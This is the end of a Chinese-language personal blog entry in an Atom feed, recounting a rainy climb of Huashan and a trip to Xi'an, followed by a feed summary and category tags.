<p><div align="center"><br><img src="/img/xian_13.png" align="center"><br></div><br>总的来说，这次旅行除了把我照成包子脸以外还是很好的，我们突破了自己，冒雨登上华山，靠意念一天走了三个景点，行程安排恰当，没有浪费时间，不仓促。期待我们的下次旅行哦，该你写了哈。。。。。。<br>                                                                                                                2018年9月18日晚<br>                                                                                                                        LU  LU</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><em>说好的一人一篇游记，3年了，妹子的这篇游记终于出炉了</em><br>自打成都到西安通高铁，周围无数同事到西安打卡，我也是心心念念好久，一直没有机会，趁这次中级会计考完，特想放松放松。周一开会时坐旁边的同事去过西安，心血来潮，跟小哥哥商量去西安可好，小哥哥痛快答应，于是开启了这次断腿的旅程。</p>
<p><div align="center"><br><img src="/img/xian_1.png" align="center"/><br></div><br>]]>
    
    </summary>
    
      <category term="生活" scheme="http://www.youngroe.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="西安" scheme="http://www.youngroe.com/tags/%E8%A5%BF%E5%AE%89/"/>
    
      <category term="Life" scheme="http://www.youngroe.com/categories/Life/"/>
    
  </entry>
  
</feed>